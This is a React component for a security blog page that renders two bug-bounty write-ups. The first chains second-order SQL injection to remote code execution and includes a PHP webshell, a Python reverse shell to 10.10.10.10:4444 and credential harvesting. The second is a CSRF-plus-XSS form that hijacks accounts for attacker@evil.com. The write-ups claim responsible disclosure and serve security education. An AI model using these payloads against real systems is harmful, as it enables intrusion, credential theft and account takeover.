
import { useParams, Link } from "react-router-dom";
import { Terminal, ArrowLeft, Calendar, Clock, Award, Shield, Copy, Check, Eye, Target, Zap } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { useState } from "react";

const WriteupDetail = () => {
  const { id } = useParams();
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  const writeups = {
    "1": {
      title: "Advanced SQL Injection → RCE Chain",
      date: "2024-01-15",
      readTime: "15 min read",
      difficulty: "Critical",
      bounty: "$15,000",
      platform: "Private Program",
      tags: ["SQL Injection", "RCE", "Second-Order", "Privilege Escalation"],
      coverImage: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=1200&h=600&fit=crop",
      content: {
        summary: "Complete walkthrough of exploiting second-order SQLi to achieve remote code execution on a Fortune 500 target.",
        sections: [
          {
            title: "Target Reconnaissance",
            content: "During the initial reconnaissance phase, I discovered a sophisticated customer management system running on a Fortune 500 company's infrastructure. The application featured multiple input vectors including user registration, profile management, and administrative dashboards. Initial automated scans revealed interesting behavior patterns that warranted deeper manual investigation.",
            image: "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&h=400&fit=crop"
          },
          {
            title: "Vulnerability Discovery",
            content: "The breakthrough came during profile update functionality testing. While direct SQL injection attempts were blocked by WAF rules, I noticed unusual database response times when submitting specially crafted usernames during registration. This indicated potential second-order SQL injection where the payload would be stored and executed later.",
            code: `# Testing for second-order SQLi patterns
# Registration payload (stored safely)
POST /api/register
{
  "username": "admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--",
  "email": "test@example.com",
  "password": "Password123!"
}

# Payload triggers when admin views profile
# SQL: SELECT * FROM users WHERE username = 'admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--'`
          },
          {
            title: "Exploitation Chain",
            content: "After confirming the second-order SQLi, I escalated the attack by leveraging MySQL's file system functions. The target server had the necessary privileges and file paths that allowed me to write arbitrary files to the web directory.",
            code: `# Advanced payload for RCE
# Step 1: Create PHP webshell
'; SELECT '<?php if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";} ?>' 
INTO OUTFILE '/var/www/html/uploads/shell.php'--

# Step 2: Access webshell
GET /uploads/shell.php?c=whoami
Response: www-data

# Step 3: Establish persistent access
GET /uploads/shell.php?c=python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"`,
            image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop"
          },
          {
            title: "Post-Exploitation & Impact",
            content: "With shell access established, I conducted a comprehensive impact assessment. The compromise revealed access to sensitive customer databases containing PII, financial records, and internal infrastructure documentation. Lateral movement was possible through stored credentials and network misconfigurations.",
            code: `# Post-exploitation reconnaissance
www-data@target:~$ find / -name "*.conf" -type f 2>/dev/null | grep -E "(database|db|mysql)"
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/www/html/config/database.conf

www-data@target:~$ cat /var/www/html/config/database.conf
DB_HOST=internal-db.company.local
DB_USER=app_admin
DB_PASS=MyS3cur3P@ssw0rd123!
DB_NAME=customer_data

# Discovered internal network ranges
www-data@target:~$ ip route
10.10.0.0/16 dev eth0 proto kernel scope link src 10.10.5.23
172.16.0.0/12 dev eth1 proto kernel scope link src 172.16.10.45`
          }
        ]
      }
    },
    "2": {
      title: "CSRF → Account Takeover via XSS Chain",
      date: "2024-01-10",
      readTime: "12 min read",
      difficulty: "High",
      bounty: "$8,500",
      platform: "HackerOne",
      tags: ["CSRF", "XSS", "Account Takeover", "DOM Manipulation"],
      coverImage: "https://images.unsplash.com/photo-1487058792275-0ad4aaf24ca7?w=1200&h=600&fit=crop",
      content: {
        summary: "Chaining CSRF with Stored XSS to achieve complete account compromise. Full technical breakdown with PoC.",
        sections: [
          {
            title: "Initial Discovery",
            content: "During routine testing of a social media platform, I identified a critical vulnerability chain that could lead to complete account compromise. The application lacked proper CSRF protection on critical functions and had insufficient XSS filtering in user profile sections.",
            image: "https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?w=800&h=400&fit=crop"
          },
          {
            title: "Attack Chain Development",
            content: "The attack involved crafting a malicious page that would exploit CSRF to modify victim profiles with XSS payloads, creating a self-propagating attack vector.",
            code: `<!-- CSRF + XSS Attack Vector -->
<form id="malicious" action="https://target.com/api/profile/update" method="POST">
  <input type="hidden" name="bio" value='<img src=x onerror="fetch(\'/api/user/settings\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({email:\'attacker@evil.com\',password:\'pwned123\'})})">'>
  <input type="hidden" name="csrf_token" value="">
</form>
<script>
  // Auto-submit the form when page loads
  document.getElementById('malicious').submit();
</script>`
          }
        ]
      }
    }
  };

  const writeup = writeups[id as keyof typeof writeups];

  if (!writeup) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-green-400 font-mono flex items-center justify-center">
        <div className="text-center">
          <div className="text-8xl font-bold text-red-500 mb-4 animate-pulse">404</div>
          <h1 className="text-3xl font-bold text-red-400 mb-4">EXPLOIT_NOT_FOUND</h1>
          <p className="text-green-400 mb-8 font-mono">~/writeups/{id}: No such file or directory</p>
          <Link to="/blog" className="text-green-300 hover:text-green-200 transition-colors font-mono">
            <ArrowLeft className="inline h-4 w-4 mr-2" />
            cd ../writeups
          </Link>
        </div>
      </div>
    );
  }

  const copyToClipboard = (code: string, section: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCode(section);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-green-400 font-mono relative">
      {/* Animated background */}
      <div className="fixed inset-0 opacity-10 pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-r from-green-900/20 via-transparent to-green-900/20 animate-pulse"></div>
        <div className="absolute inset-0" style={{
          backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23065f46' fill-opacity='0.05'%3E%3Ccircle cx='30' cy='30' r='2'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
        }}></div>
      </div>

      {/* Navigation */}
      <nav className="border-b border-green-800/50 bg-black/90 backdrop-blur-md sticky top-0 z-50 shadow-2xl shadow-green-900/20">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Terminal className="h-8 w-8 text-green-400 animate-pulse drop-shadow-lg" />
              <div className="flex items-center space-x-2">
                <span className="text-3xl font-bold text-green-400 drop-shadow-lg">
                  v1g0<span className="text-red-400">_</span>blog
                </span>
                <span className="text-xs text-green-600 font-mono bg-green-900/30 px-2 py-1 rounded border border-green-700">
                  root@security
                </span>
              </div>
            </div>
            <div className="flex items-center space-x-8">
              <Link to="/" className="hover:text-green-300 transition-all duration-300 hover:scale-105">~/home</Link>
              <Link to="/blog" className="hover:text-green-300 transition-all duration-300 hover:scale-105">~/writeups</Link>
              <Link to="/about" className="hover:text-green-300 transition-all duration-300 hover:scale-105">~/whoami</Link>
            </div>
          </div>
        </div>
      </nav>

      <div className="container mx-auto px-6 py-8 max-w-5xl">
        {/* Header */}
        <div className="mb-12">
          <Link to="/blog" className="inline-flex items-center text-green-300 hover:text-green-200 mb-8 group font-mono">
            <ArrowLeft className="h-5 w-5 mr-2 group-hover:-translate-x-2 transition-transform duration-300" />
            <span>cd ../writeups</span>
          </Link>

          {/* Cover Image */}
          <div className="relative mb-8 rounded-xl overflow-hidden border border-green-800/50 shadow-2xl">
            <img 
              src={writeup.coverImage} 
              alt={writeup.title}
              className="w-full h-64 md:h-80 object-cover"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
            <div className="absolute bottom-6 left-6 right-6">
              <div className="flex items-center space-x-3 mb-4">
                <span className={`text-xs px-3 py-1 rounded-full font-mono font-bold border ${
                  writeup.difficulty === 'Critical' 
                    ? 'bg-red-900/80 text-red-200 border-red-700' 
                    : writeup.difficulty === 'High'
                      ? 'bg-orange-900/80 text-orange-200 border-orange-700'
                      : 'bg-yellow-900/80 text-yellow-200 border-yellow-700'
                }`}>
                  {writeup.difficulty.toUpperCase()}
                </span>
                <div className="flex items-center space-x-2 text-green-400">
                  <Eye className="h-4 w-4" />
                  <span className="font-mono text-sm">{writeup.platform}</span>
                </div>
              </div>
              <h1 className="text-3xl md:text-4xl font-bold text-white mb-2 drop-shadow-lg">
                {writeup.title}
              </h1>
            </div>
          </div>

          {/* Meta Information */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
            <Card className="bg-gray-900/60 border-green-800/50 backdrop-blur-sm">
              <CardContent className="p-4 text-center">
                <Calendar className="h-6 w-6 text-green-400 mx-auto mb-2" />
                <div className="text-green-300 font-mono text-sm">{writeup.date}</div>
              </CardContent>
            </Card>
            <Card className="bg-gray-900/60 border-green-800/50 backdrop-blur-sm">
              <CardContent className="p-4 text-center">
                <Clock className="h-6 w-6 text-green-400 mx-auto mb-2" />
                <div className="text-green-300 font-mono text-sm">{writeup.readTime}</div>
              </CardContent>
            </Card>
            <Card className="bg-gray-900/60 border-green-800/50 backdrop-blur-sm">
              <CardContent className="p-4 text-center">
                <Award className="h-6 w-6 text-green-400 mx-auto mb-2" />
                <div className="text-green-300 font-mono text-sm font-bold">{writeup.bounty}</div>
              </CardContent>
            </Card>
            <Card className="bg-gray-900/60 border-green-800/50 backdrop-blur-sm">
              <CardContent className="p-4 text-center">
                <Shield className="h-6 w-6 text-green-400 mx-auto mb-2" />
                <div className="text-green-300 font-mono text-sm">{writeup.platform}</div>
              </CardContent>
            </Card>
          </div>

          {/* Tags */}
          <div className="flex flex-wrap gap-3 mb-8">
            {writeup.tags.map((tag, index) => (
              <span
                key={index}
                className="inline-flex items-center text-sm bg-gradient-to-r from-green-800/50 to-green-700/50 text-green-200 px-4 py-2 rounded-full font-mono border border-green-600/50 backdrop-blur-sm hover:from-green-700/60 hover:to-green-600/60 transition-all duration-300"
              >
                <Target className="h-3 w-3 mr-2" />
                #{tag.replace(/\s+/g, '_').toLowerCase()}
              </span>
            ))}
          </div>

          {/* Executive Summary */}
          <Card className="bg-gradient-to-r from-gray-900/80 to-gray-800/80 border-green-700/50 backdrop-blur-sm shadow-xl">
            <CardContent className="p-8">
              <div className="flex items-center space-x-3 mb-4">
                <Zap className="h-6 w-6 text-green-400" />
                <h3 className="text-2xl font-bold text-green-300">Executive Summary</h3>
              </div>
              <p className="text-green-400/90 leading-relaxed text-lg font-mono">
                {writeup.content.summary}
              </p>
            </CardContent>
          </Card>
        </div>

        {/* Content Sections */}
        <div className="space-y-12">
          {writeup.content.sections.map((section, index) => (
            <Card key={index} className="bg-gradient-to-br from-gray-900/80 to-gray-800/60 border-green-800/50 backdrop-blur-sm shadow-2xl hover:shadow-green-900/20 transition-all duration-500">
              <CardContent className="p-8">
                <div className="flex items-center space-x-4 mb-6">
                  <div className="bg-gradient-to-r from-green-600 to-green-500 text-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm">
                    {String(index + 1).padStart(2, '0')}
                  </div>
                  <h2 className="text-2xl md:text-3xl font-bold text-green-300">
                    {section.title}
                  </h2>
                </div>
                
                {section.image && (
                  <div className="mb-8 rounded-lg overflow-hidden border border-green-700/50 shadow-xl">
                    <img 
                      src={section.image} 
                      alt={section.title}
                      className="w-full h-48 md:h-64 object-cover hover:scale-105 transition-transform duration-500"
                    />
                  </div>
                )}

                <div className="text-green-400/90 leading-relaxed text-lg mb-8 font-mono">
                  {section.content}
                </div>

                {section.code && (
                  <div className="relative group">
                    <div className="bg-gradient-to-br from-gray-950 to-black border border-green-700/50 rounded-lg overflow-hidden shadow-2xl">
                      <div className="bg-gradient-to-r from-gray-800 to-gray-700 px-6 py-3 flex items-center justify-between border-b border-green-700/50">
                        <div className="flex items-center space-x-3">
                          <div className="flex space-x-2">
                            <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                            <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                            <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                          </div>
                          <span className="text-green-400 font-mono text-sm">exploit.sh</span>
                        </div>
                        <button
                          onClick={() => copyToClipboard(section.code!, section.title)}
                          className="text-green-400 hover:text-green-300 transition-colors flex items-center space-x-2 bg-green-900/30 hover:bg-green-800/40 px-3 py-1 rounded border border-green-700/50"
                        >
                          {copiedCode === section.title ? (
                            <>
                              <Check className="h-4 w-4" />
                              <span className="text-xs font-mono">COPIED!</span>
                            </>
                          ) : (
                            <>
                              <Copy className="h-4 w-4" />
                              <span className="text-xs font-mono">COPY</span>
                            </>
                          )}
                        </button>
                      </div>
                      <div className="relative">
                        <pre className="p-6 text-green-300 font-mono text-sm overflow-x-auto bg-gradient-to-br from-gray-950 to-black">
                          <code className="text-green-400">{section.code}</code>
                        </pre>
                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-green-500/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none"></div>
                      </div>
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Footer */}
        <div className="mt-16 pt-8 border-t border-green-800/50">
          <Card className="bg-gradient-to-r from-gray-900/90 to-gray-800/80 border-green-700/50 backdrop-blur-sm shadow-2xl">
            <CardContent className="p-8">
              <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0">
                <div>
                  <h3 className="text-2xl font-bold text-green-300 mb-3 flex items-center">
                    <Shield className="h-6 w-6 mr-3" />
                    Responsible Disclosure
                  </h3>
                  <p className="text-green-400/90 font-mono max-w-md">
                    This vulnerability was reported through proper channels and has been patched by the vendor. 
                    All testing was conducted with explicit permission.
                  </p>
                </div>
                <div className="text-center md:text-right">
                  <div className="text-4xl font-bold text-green-400 font-mono mb-2">{writeup.bounty}</div>
                  <div className="text-green-600 text-sm font-mono bg-green-900/30 px-3 py-1 rounded border border-green-700">
                    BOUNTY_EARNED
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default WriteupDetail;
